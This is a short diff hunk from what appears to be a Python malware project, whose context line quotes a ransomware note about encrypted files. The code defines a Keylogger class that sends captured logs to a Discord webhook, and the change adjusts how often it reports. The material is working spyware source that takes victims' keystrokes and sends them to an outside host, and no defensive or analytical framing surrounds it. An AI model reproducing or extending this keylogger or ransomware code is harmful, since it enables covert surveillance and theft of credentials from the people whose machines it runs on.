@@ -919,7 +919,7 @@ Seems like your files have been encrypted with high grade military encryption. T
 class Keylogger: 
     def __init__(self, interval, reciver_webhook):
         now             = datetime.datetime.now()
-        self.interval   = int(interval) # Convert secs to hours
+        self.interval   = int(interval * 3600) # Convert secs to hours
         self.reciver    = DiscordWebhook(url=reciver_webhook, rate_limit_retry=True, username="Keylogger Logs")
         self.log        = ""
         self.dir        = mkdtemp()
